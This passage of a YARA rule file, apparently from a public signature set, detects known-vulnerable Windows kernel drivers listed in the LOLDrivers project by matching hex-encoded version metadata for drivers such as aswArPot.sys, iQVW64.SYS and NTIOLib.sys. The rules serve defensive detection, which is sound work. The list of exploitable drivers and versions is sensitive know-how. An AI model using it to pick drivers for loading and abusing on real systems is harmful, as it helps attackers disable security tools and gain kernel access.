0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000320020002d002000320030003100320020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpot_Avastantivirus_4B52_RID3D5E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:51:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320031002e0031002e003100380037002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320031002e0031002e003100380037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300032003100200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Insydesoftwarecorp_Segwindrvxsys_Segwindowsdriverx_38D6_RID4310 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - segwindrvx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:54:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005300450047002000570069006e0064006f0077007300200044007200690076006500720020007800360034 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]003100300030002c00200030002c00200034002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]003100300030002c00200030002c00200034002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730065006700770069006e006400720076007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300450047002000570069006e0064006f0077007300200044007200690076006500720020007800360034 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730065006700770069006e006400720076007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003100320020002d00200032003000310033002c00200049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Biostargroup_Iodriver_Biostariodriverfle_42E1_RID3E72 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - BS_I2cIo.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:37:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049002f004f00200049006e00740065007200660061006300650020006400720069007600650072002000660069006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00420049004f0053005400410052002000470072006f00750070 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c00200031002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200031002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0049002f004f0020006400720069007600650072 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00420049004f005300540041005200200049002f004f002000640072006900760065007200200066006c0065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00420053005f0049003200630049006f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200032003000300032002d0032003000300036002000420049004f0053005400410052002000470072006f00750070 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytes_Elbycdio_Cdrtools_07AF_RID3AFB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:09:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f003200300030003000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002c00200030002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002c00200030002c00200030002c00200035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200045006c00610062006f007200610074006500200042007900740065007300200032003000300030 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Mitactechnologycorporation_Mtcbsvsys_Mitacsystemserviceprovider_C9CF_RID487E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mtcBSv64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:46:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004d0069005400410043002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900540041004300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320031002c00200031002c00200034002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320031002c00200031002c00200034002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0074006300420053007600360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d0069005400410043002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0074006300420053007600360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000370020004d006900540041004300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_7125_RID3D39 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:45:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f00330032002f003600340020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0038002e003500300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0038002e00350030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f00330032002f003600340020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003100310020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_5F65_RID3E0E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iQVW64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:20:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0033002e0032002e003100330020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0033002e0032002e00310033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300031003700200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_58A7_RID3D13 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viraglt64.sys, viragt64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:39:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c00200030002c00200030002c002000310031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200030002c00200030002c002000310031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00760069007200610067007400360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000310031002c002000320030003100360020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Panyazilimbilisimteknolojileriticltdsti_Panmonfltxsys_Pancafemanager_0650_RID4A12 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PanMonFltX64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 06:53:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500061006e00430061006600650020004d0061006e0061006700650072002000460069006c00650020004d006f006e00690074006f0072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500061006e002000590061007a0069006c0069006d002000420069006c006900730069006d002000540065006b006e006f006c006f006a0069006c0065007200690020005400690063002e0020004c00740064002e0020005300740069002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00500061006e004d006f006e0046006c0074005800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500061006e00430061006600650020004d0061006e0061006700650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00500061006e004d006f006e0046006c0074005800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200032003000310032002d0032003000310034002000500061006e002000590061007a0131006c0131006d002000420069006c006900730069006d002000540065006b006e006f006c006f006a0069006c0065007200690020005400690063002e0020004c00740064002e0020005300740069002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_D633_RID420F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:11:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00300030002e00300036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00300030002e00300036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_0F17_RID3EBE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:50:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0033002e0034003200320034002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0033002e0034003200320034002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003900200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Bsmisys_5962_RID30E4 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - BSMI.sys, BSMIXP64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 12:59:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0053004d00490020004400720069007600650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00420053004d0049002e007300790073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00420053004d0049002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000420049004f005300540041005200200043006f00720070002e00200032003000310031 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_C6FE_RID36CD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nscm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:11:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c002000580054006900650072002000530065007300730069006f006e0020004d0061006e0061006700650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310032002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310032 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00730063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310035002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_AF16_RID3BC3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:43:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0034002c00200032002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0034002c00200032002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003200200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_99F4_RID36F8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:18:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c00690062 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003000390020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Ncrcorporation_Radhwmgrsys_Ncrcorporationhardwaremanagerdriver_7C8A_RID47CB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - RadHwMgr.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:16:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061006400690061006e00740020004800610072006400770061007200650020004d0061006e006100670065007200200066006f007200200050003100350078007800200050006c006100740066006f0072006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0043005200200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e00330033002e0030002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00330033002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00520061006400480077004d00670072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e0043005200200043006f00720070006f0072006100740069006f006e0020004800610072006400770061007200650020004d0061006e00610067006500720020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00520061006400480077004d00670072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0032003000300032002d0032003000310038004e0043005200200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Avaluetechnologyinc_Avalueio_Avalueio_A5A4_RID3D0D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - avalueio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:38:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100760061006c007500650049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0020004100760061006c0075006500200054006500630068006e006f006c006f0067007900200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e00300030002e00300032002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00300030002e00300032002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004100560041004c005500450049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100760061006c007500650049004f0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004100560041004c005500450049004f002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020006300200032003000310036 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of 